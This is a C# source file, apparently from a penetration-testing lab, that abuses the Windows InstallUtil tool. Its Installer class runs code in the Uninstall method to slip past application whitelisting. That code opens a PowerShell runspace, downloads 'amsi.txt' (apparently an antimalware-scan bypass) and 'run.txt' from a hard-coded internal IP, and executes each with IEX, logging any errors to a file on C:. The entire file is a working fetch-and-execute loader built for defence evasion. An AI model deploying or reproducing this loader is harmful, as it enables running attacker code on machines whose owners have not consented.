using System;
using System.Collections.Specialized;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Xml.Linq;

namespace InstallUtil
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            Run(ps, "amsi.txt");
            Run(ps, "run.txt");
            rs.Close();
        }

        private void Run(PowerShell ps, String resource)
        {
            String cmd = $"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/{resource}') | IEX";
            ps.AddScript(cmd);
            var results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Console.WriteLine(result.ToString());
            }
            // Surface PowerShell errors — otherwise failures are silent:
            foreach (var err in ps.Streams.Error)
            {
                System.IO.File.AppendAllText(@"C:\hta_error.txt", resource + ": " + err.ToString() + Environment.NewLine);
            }
            ps.Commands.Clear();
        }
    }
}
